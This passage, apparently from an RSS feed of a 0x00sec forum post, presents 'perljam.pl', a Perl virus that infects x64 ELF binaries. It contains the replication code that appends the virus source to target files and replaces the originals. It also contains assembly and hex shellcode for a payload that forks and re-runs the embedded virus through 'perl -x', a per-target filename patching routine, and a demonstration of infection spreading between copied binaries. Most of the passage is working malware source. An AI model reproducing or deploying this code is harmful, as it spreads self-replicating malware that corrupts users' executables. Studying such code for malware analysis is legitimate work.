+To achieve replication, perljamp.pl source code must be appended to the infected binary. To carry out this task, the virus should open itself (using the predefined variable $0) and append its content after the jump instruction. Note that if perljam.pl is executed from an infected binary then a search for the string "<i>#!/usr/bin/perl</i>" must be performed to ensure that only the source code of the virus is copied and not the content of the binary. The virus source code is read before the main loop and it's written on each infection.
+ </p>
+<pre><code class="lang-auto"> #
+ # virus code
+ #
+ # search for '#!/usr/bin/perl' first to avoid copying extra data
+ my $vx;
+ open my $fh_vx, '&lt;', $0;
+ while(&lt;$fh_vx&gt;) {
+    last if($_ =~ q(#!/usr/bin/perl));
+ }
+ $vx  = "#!/usr/bin/perl\n";
+ $vx .= $_ while(&lt;$fh_vx&gt;);
+ close $fh_vx;
+ # virus size
+ my $vx_sz = length($vx);
+
+ [...]
+ [...]
+
+ #
+ # append virus code
+ #
+ syswrite $fh_tmp, "\n".$vx;
+</code></pre>
+<h3><span>[ overwrite binary ]</span></h3>
+ <p>At this point the virus has created an infected copy of the binary. The final step is to delete the original binary and replace it with the infected copy.
+</p>
+<pre><code class="lang-auto"> close $fh;
+ close $fh_tmp;
+
+ # replace original binary with tmp copy
+ unlink $file;
+ copy("$file.tmp", $file);
+ unlink "$file.tmp";
+ chmod 0755, $file;
+</code></pre>
+<br>
+<h2><span>[ part 2: payload &amp; replication ]</span></h2>
+ <p>
+The harcoded payload consists of two combined shellcodes. The first one prints to stdout an extract from the song "release" by Pearl Jam. The second one performs the virus replication by running the infected binary as a perl script. For this the perl interpreter must be executed using the -x switch, which according to <a href="https://perldoc.perl.org/perlrun#-x" target="_blank" rel="noopener nofollow ugc">Perl's documentation</a>:
+</p>
+<blockquote>
+<p>tells Perl that the program is embedded in a larger chunk of unrelated text, such as in a mail message. Leading garbage will be discarded until the first line that starts with #! and contains the string “perl”</p>
+</blockquote>
+<p>Therefore, an execve syscall for "<i>/usr/bin/perl -x infected_binary</i>" will run the perljam.pl source code embedded in the infected binary. This syscall must be  invoked inside a child process (fork) to prevent the interruption of the original program code.
+ </p>
+<p>
+However, the "infected_binary" (filename) argument in the execve syscall needs to change on each infection according to the binary's filename. To achieve this an initial version of the assembly code is compiled using a fixed string of length 255 (maximum filename length on Linux) as the filename argument. This string will be replaced later.
+</p>
+<p>The following assembly code combines the two shellcodes mentioned before:</p>
+<pre><code class="lang-auto">BITS 64
+global _start
+section .text
+_start:
+    call main
+    db "i am myself, like you somehow", 0xa, 0x0
+    db "/usr/bin/perl", 0x0
+    db "-x", 0x0
+    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+    db "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", 0x0
+    
+ main:
+    ;;;;;;;;;;;;
+    ; print msg
+    ;;;;;;;;;;;;
+    xor rax, rax
+    xor rdx, rdx
+    inc al
+    mov rdi, rax
+    pop rsi
+    mov dl, 30
+    syscall
+
+    ;;;;;;;;
+    ; fork
+    ;;;;;;;;
+    xor rax, rax
+    mov rax, 57
+    syscall
+    test eax, eax
+    jne parent
+
+    ;;;;;;;;;;;;;;;;;;;;;;;;;
+    ; call perl interpreter
+    ;;;;;;;;;;;;;;;;;;;;;;;;;
+
+    ; filename "/usr/bin/perl"
+    lea rdi, [rsi+31]   
+    
+    ; argv
+    ; ["/usr/bin/perl", "-x", "xxxxx..."] (on reverse)
+    xor rdx, rdx
+    push rdx
+    lea rbx, [rsi+48] ; "xxx..."
+    push rbx
+    lea rbx, [rsi+45] ; "-x"
+    push rbx
+    push rdi          ; "/usr/bin/perl"
+    mov rsi, rsp 
+
+    ; execve &amp; exit
+    xor rax, rax
+    mov rax, 59
+    mov rdx, 0
+    syscall
+    xor rdx, rdx
+    mov rax, 60
+    syscall
+
+ parent:
+    ; cleanup for the jmp instruction
+    xor rax, rax
+    xor rdx, rdx
+</code></pre>
+<p>The code is then compiled to extract its hexadecimal representation.</p>
+<blockquote>
+<p>$ nasm -f elf64 -o perljam.o perljam.s<br>
+$ objdump -d perljam.o</p>
+</blockquote>
+<p> After this, the harcoded payload is generated by removing the hexadecimal representation of the fixed string (\x78 * 255) and then splitting the remaining shellcode in two: before and after the fixed string.
+</p>
+<pre><code class="lang-auto">my ($payload_prefix, $payload_suffix);
+$payload_prefix  = "\xe8\x30\x01\x00\x00\x69\x20\x61\x6d\x20\x6d\x79\x73\x65";
+$payload_prefix .= "\x6c\x66\x2c\x20\x6c\x69\x6b\x65\x20\x79\x6f\x75\x20\x73";
+$payload_prefix .= "\x6f\x6d\x65\x68\x6f\x77\x0a\x00\x2f\x75\x73\x72\x2f\x62";
+$payload_prefix .= "\x69\x6e\x2f\x70\x65\x72\x6c\x00\x2d\x78\x00";
+
+$payload_suffix  = "\x00\x48\x31\xc0\x48\x31\xd2\xfe\xc0\x48\x89\xc7\x5e\xb2";
+$payload_suffix .= "\x1e\x0f\x05\x48\x31\xc0\xb8\x39\x00\x00\x00\x0f\x05\x85";
+$payload_suffix .= "\xc0\x75\x2f\x48\x8d\x7e\x1f\x48\x31\xd2\x52\x48\x8d\x5e";
+$payload_suffix .= "\x30\x53\x48\x8d\x5e\x2d\x53\x57\x48\x89\xe6\x48\x31\xc0";
+$payload_suffix .= "\xb8\x3b\x00\x00\x00\xba\x00\x00\x00\x00\x0f\x05\x48\x31";
+$payload_suffix .= "\xd2\xb8\x3c\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x31\xd2";
+</code></pre>
+<p>
+The payload is adjusted on each infection by inserting the hexadecimal representation of the infected binary's filename plus N null bytes, where:
+</p>
+<blockquote>
+<p>N = 255 - length(infected binary’s filename)</p>
+</blockquote>
+<p>
+Filling with N null bytes after the infected binary's filename ensures that the payload will not crash on runtime, since adding or removing bytes will break the shellcode. In addition, the first null byte located after the infected binary's filename will be interpreted by the machine as the end of the string and the remaining null values will be ignored.
+</p>
+<p>
+            The adjustment can be done as follows:
+</p>
+<pre><code class="lang-auto"> syswrite $fh_tmp, $payload_prefix;
+ # adjust payload with target's filename
+ my @chars = split //, $file;
+ for(my $i = 0; $i &lt; length($file); $i++) {
+     wp($fh_tmp, "C", 0x1, (hex unpack("H2", $chars[$i])));
+ } 
+ # fill with null values
+ for(my $i = length($file); $i &lt; 255; $i++) {
+     wp($fh_tmp, "C", 0x1, (0x00));
+ }
+ syswrite $fh_tmp, $payload_suffix;
+</code></pre>
+<br>
+<h2><span>[ part 3: run ]</span></h2>
+<p>To run:</p>
+<blockquote>
+<p>$ perl perljam.pl</p>
+</blockquote>
+<p>Example:</p>
+<pre><code class="lang-auto"> $ cp /bin/id .
+ $ ./id
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+ $ perl perljam.pl
+ $ ./id
+ i am myself, like you somehow
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+ $ cp /bin/id id2
+ $ ./id2
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+ $ ./id
+ i am myself, like you somehow
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+ $ ./id2
+ i am myself, like you somehow
+ uid=1000(isra) gid=1000(isra) grupos=1000(isra) [..]
+</code></pre>
+          <p><a href="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373/1</link>
+        <pubDate>Fri, 11 Aug 2023 14:20:45 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-36373-1</guid>
+        <source url="https://0x00sec.org/t/perljam-pl-a-perl-x64-elf-virus/36373.rss">Perljam.pl: A Perl x64 ELF virus</source>
+      </item>
+  </channel>
+</rss>
